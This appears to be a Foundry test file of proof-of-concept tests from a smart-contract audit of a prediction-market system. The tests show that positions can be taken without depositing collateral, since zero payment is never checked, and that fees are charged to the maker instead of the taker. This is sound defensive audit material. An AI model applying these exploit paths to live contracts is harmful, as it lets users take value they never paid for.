// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {MarketContract} from "../../src/Market/Market.sol";
import {MarketController} from "../../src/Market/MarketController.sol";
import {IMarketController} from "../../src/Market/IMarketController.sol";
import "../../src/Token/PositionTokens.sol";
import "../../src/Market/MarketResolver.sol";
import "../../src/Vault/Vault.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {CommonBase} from "forge-std/Base.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {StdAssertions} from "forge-std/StdAssertions.sol";
import {StdChains} from "forge-std/StdChains.sol";
import {StdCheats, StdCheatsSafe} from "forge-std/StdCheats.sol";
import {StdUtils} from "forge-std/StdUtils.sol";
import {Test, console} from "forge-std/Test.sol";

contract POCs is Test {
    MarketContract public marketContract;
	MarketController public marketController;
	PositionTokens public positionTokens;
	MarketResolver public marketResolver;
	Vault public vault;
    ERC20Mock public collateralToken;

    address public owner = makeAddr("owner");
    address public matcher = makeAddr("matcher");

    address public alice;
    address public bob;
    address public david; 

    address public oracle = makeAddr("oracle");
    address public unauthorized = makeAddr("unauthorized");
    address public treasury = makeAddr("treasury");

    bytes32 public questionId = keccak256("BTC_PRICE_BINARY");
    bytes32 public questionId2 = keccak256("ETH_PRICE_BINARY");
    bytes32 public invalidQuestionId = bytes32(0);

    uint256 public constant BINARY_OUTCOMES = 2;
    uint256 public constant MULTI_OUTCOMES = 4;
	uint256 public constant DEFAULT_FEE_RATE = 400; // 4%
	uint256 public constant DEFAULT_TRADE_FEE_RATE = 400; // 4%

    uint256 public privateKeyAlice; 
    uint256 public privateKeyBob; 
    uint256 public privateKeyDavid; 

    bytes32 public merkleRoot1 = keccak256("merkle_root_1");
    bytes32 public merkleRoot2 = keccak256("merkle_root_2");

    function setUp() public {
        vm.startPrank(owner);

        (alice, privateKeyAlice)  = makeAddrAndKey("alice");
        (bob, privateKeyBob ) = makeAddrAndKey("bob");
        (david, privateKeyDavid ) = makeAddrAndKey("david");

		// Deploy collateral token
		collateralToken = new ERC20Mock();

		// Deploy market contract
        MarketContract marketImpl = new MarketContract();
        bytes memory initData_market = abi.encodeWithSelector(MarketContract.initialize.selector, owner);
        marketContract = MarketContract(address(new ERC1967Proxy(address(marketImpl), initData_market)));

		// Deploy position tokens
        PositionTokens positionTokensImpl = new PositionTokens();
        bytes memory initData_positionTokens = abi.encodeWithSelector(PositionTokens.initialize.selector, owner);
        positionTokens = PositionTokens(address(new ERC1967Proxy(address(positionTokensImpl), initData_positionTokens)));

		// Deploy market resolver
        MarketResolver marketResolverImpl = new MarketResolver();
        bytes memory initData_resolver = abi.encodeWithSelector(MarketResolver.initialize.selector, owner, oracle);
        marketResolver = MarketResolver(address(new ERC1967Proxy(address(marketResolverImpl), initData_resolver)));	

		// Deploy market controller
        MarketController marketControllerImpl = new MarketController();
        bytes memory initData_controller = abi.encodeWithSelector(
            MarketController.initialize.selector,
            owner,
            address(positionTokens),
            address(marketResolver),
            address(marketResolver), // momentary bad address
            address(marketContract),
            oracle
        );
        marketController = MarketController(address(new ERC1967Proxy(address(marketControllerImpl), initData_controller)));

		// Deploy Vault 
        Vault vaultImpl = new Vault();
        bytes memory initData_vault =
            abi.encodeWithSelector(Vault.initialize.selector, owner, address(collateralToken), address(marketController));
        vault = Vault(address(new ERC1967Proxy(address(vaultImpl), initData_vault)));

		// Market contract settings
		marketContract.setMarketController(address(marketController));

		// Market controller settings 
        marketController.updateVault(address(vault)); 
        marketController.setAuthorizedMatcher(matcher, true);
        marketController.setAuthorizedMatcher(owner, true);
		marketController.setFeeRate(DEFAULT_FEE_RATE);
		marketController.setTradeFeeRate(DEFAULT_TRADE_FEE_RATE);
        marketController.setTreasury(treasury);
		
		// Position tokens settings
		positionTokens.setMarketController(address(marketController));

        vm.stopPrank();
    }

    //@audit-high, in market controller, users are able to mint positions tokens using 0 USDC. 
    // This is possible since there is not a check of paymentAmount, that could be 0 and the payment would be processed as usual.
    function test_usersAreAbleToMintTokensByUsing0USDC() public {
         // Bob and Alice mint tokens
        vm.startPrank(bob); 
        deal(address(collateralToken), bob, 100e6); 
        collateralToken.approve(address(vault), 100e6);
        vault.depositCollateral(100e6);
        vm.stopPrank(); 

        vm.startPrank(alice); 
        deal(address(collateralToken), alice, 100e6); 
        collateralToken.approve(address(vault), 100e6);
        vault.depositCollateral(100e6);
        vm.stopPrank(); 

        uint256 BET_AMOUNT = 100e6; 

        // Create market
        vm.startPrank(owner); 
        marketController.createMarket(questionId, 2, block.timestamp + 86400, 0);
        vm.stopPrank(); 


        // Create orders
        IMarketController.Order memory buyOrder = IMarketController.Order({
            user: bob,
            questionId:questionId,
            outcome: 1,
            amount: BET_AMOUNT,
            price: 6000,
            nonce: 1,
            expiration: block.timestamp + 1 hours,
            isBuyOrder: true
        });

        IMarketController.Order memory sellOrder = IMarketController.Order({
            user: alice,
            questionId: questionId,
            outcome: 1,
            amount: BET_AMOUNT,
            price: 5500,
            nonce: 1,
            expiration: block.timestamp + 1 hours,
            isBuyOrder: false
        });        

        // Sign orders
        vm.startPrank(bob);
        bytes memory buySignature = signOrder(privateKeyBob, buyOrder);
        vm.stopPrank(); 
        vm.startPrank(alice); 
        bytes memory sellSignature = signOrder(privateKeyAlice, sellOrder);
        vm.stopPrank(); 

        vm.startPrank(matcher); 
        // Execute orders
        marketController.executeOrderMatch(buyOrder, sellOrder, buySignature, sellSignature, BET_AMOUNT);
        vm.stopPrank(); 

        // Then david wants to bet on the outcome 1 with 0,003 USDC at a price of 8 (0,02% possibility)
        uint256 BET_AMOUNT_DAVID = 3e3; 
          IMarketController.Order memory buyOrder_2 = IMarketController.Order({
            user: david,
            questionId: questionId,
            outcome: 1,
            amount: BET_AMOUNT,
            price: 2,
            nonce: 1,
            expiration: block.timestamp + 1 hours,
            isBuyOrder: true
        });

         // Sign orders
        vm.startPrank(david);
        bytes memory buySignature_2 = signOrder(privateKeyDavid, buyOrder_2);
        vm.stopPrank();         

        vm.startPrank(matcher); 
        // David is able to execute his order
        // NOTE: David didn't deposited collateral in the vault, so he did this for free.
        marketController.executeSingleOrder(buyOrder_2, buySignature_2, BET_AMOUNT_DAVID, bob);

        bytes32 conditionId = marketContract.getConditionId(oracle, questionId, 2, 1);
        uint256 tokenId = positionTokens.getTokenId(conditionId, 1);
        // David's token balance increased while bob's token balance decreased
        assertEq(positionTokens.balanceOf(david, tokenId), BET_AMOUNT_DAVID); 
        assertEq(positionTokens.balanceOf(bob, tokenId), BET_AMOUNT - BET_AMOUNT_DAVID); 
    }
    
    //@audit-high, in MarketController::executeSingleOrder, if the order is a buy order, fees are wrongly calculated. 
    // According to the sponsor decision, fees are meant to be applied to the taker, but in this case they're applied to the maker.
    // NOTE: in this case, 0 fees are applied to the taker
    function test_feesAreAppliedToTheMakerInsteadOfTheTaker() public {
         // Bob, Alice and David mint tokens
        vm.startPrank(bob); 
        deal(address(collateralToken), bob, 100e6); 
        collateralToken.approve(address(vault), 100e6);
        vault.depositCollateral(100e6);
        vm.stopPrank(); 

        vm.startPrank(alice); 
        deal(address(collateralToken), alice, 100e6); 
        collateralToken.approve(address(vault), 100e6);
        vault.depositCollateral(100e6);
        vm.stopPrank(); 

        vm.startPrank(david); 
        deal(address(collateralToken), david, 100e6); 
        collateralToken.approve(address(vault), 100e6);
        vault.depositCollateral(100e6);
        vm.stopPrank(); 

        uint256 BET_AMOUNT = 100e6; 

        // Create market
        vm.startPrank(owner); 
        marketController.createMarket(questionId, 2, block.timestamp + 86400, 0);
        vm.stopPrank(); 


        // Create orders
        IMarketController.Order memory buyOrder = IMarketController.Order({
            user: bob,
            questionId:questionId,
            outcome: 1,
            amount: BET_AMOUNT,
            price: 6000,
            nonce: 1,
            expiration: block.timestamp + 1 hours,
            isBuyOrder: true
        });

        IMarketController.Order memory sellOrder = IMarketController.Order({
            user: alice,
            questionId: questionId,
            outcome: 1,
            amount: BET_AMOUNT,
            price: 5500,
            nonce: 1,
            expiration: block.timestamp + 1 hours,
            isBuyOrder: false
        });        

        // Sign orders
        vm.startPrank(bob);
        bytes memory buySignature = signOrder(privateKeyBob, buyOrder);
        vm.stopPrank(); 
        vm.startPrank(alice); 
        bytes memory sellSignature = signOrder(privateKeyAlice, sellOrder);
        vm.stopPrank(); 

        // Execute orders
        vm.startPrank(matcher); 
        marketController.executeOrderMatch(buyOrder, sellOrder, buySignature, sellSignature, BET_AMOUNT);
        vm.stopPrank(); 

        // Now let's say that bob places a sell order in the order book, he becomes the maker

        // Later, David creates a buy order, he becomes the taker
          IMarketController.Order memory buyOrder_2 = IMarketController.Order({
            user: david,
            questionId: questionId,
            outcome: 1,
            amount: BET_AMOUNT,
            price: 5500,
            nonce: 1,
            expiration: block.timestamp + 1 hours,
            isBuyOrder: true
        });
    
        // Sign orders
        vm.startPrank(david);
        bytes memory buySignature_2 = signOrder(privateKeyDavid, buyOrder_2);
        vm.stopPrank();         

        vm.startPrank(matcher); 
        marketController.executeSingleOrder(buyOrder_2, buySignature_2, BET_AMOUNT, bob);
        vm.stopPrank(); 

        // As a result, we can see that david (the taker) paid 0 total fees, and bob (the maker) paid fees
        vm.startPrank(bob); 
        //This is the fee bob paid in the first match order (with alice) 
        uint256 buyerFeeFirstOrder = (((BET_AMOUNT * 5500) / 10000) * DEFAULT_TRADE_FEE_RATE) / 10000; 
        uint256 initialBobBalance = 100e6; 

        uint256 bobCorrectBalance = initialBobBalance - buyerFeeFirstOrder; 
        uint256 effectiveFinalBalance = vault.getAvailableBalance(bob);
        
        // As we can see here, bob effective balance is lower than what it should be, this is because in the second order, when david purchased tokens, 
        // fees have been applied to bob instead of david
        console.log(bobCorrectBalance); 
        console.log(effectiveFinalBalance);
        assertLt(effectiveFinalBalance, bobCorrectBalance); 

        // David did not pay any fees
        uint256 initialDavidBalance = 100e6; 
        uint256 davidEffectiveBalance = vault.getAvailableBalance(david); 
        uint256 davidPaymentAmount = (100e6 * 5500) / 10000; 
        assertEq(davidEffectiveBalance, initialDavidBalance - (davidPaymentAmount)); 
    }

     //// Helper functions for EIP-712 signing
    function getOrderHash(IMarketController.Order memory order) internal view returns (bytes32) {
        bytes32 structHash = keccak256(abi.encode(
            keccak256("Order(address user,bytes32 questionId,uint256 outcome,uint256 amount,uint256 price,uint256 nonce,uint256 expiration,bool isBuyOrder)"),
            order.user,
            order.questionId,
            order.outcome,
            order.amount,
            order.price,
            order.nonce,
            order.expiration,
            order.isBuyOrder
        ));

        bytes32 domainSeparator = keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256("PredictionMarketOrders"),
            keccak256("1"),
            block.chainid,
            address(marketController)
        ));

        return keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
    }

    function signOrder(uint256 privateKey, IMarketController.Order memory order) internal view returns (bytes memory) {
        bytes32 hash = getOrderHash(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, hash);
        return abi.encodePacked(r, s, v);
    }

}
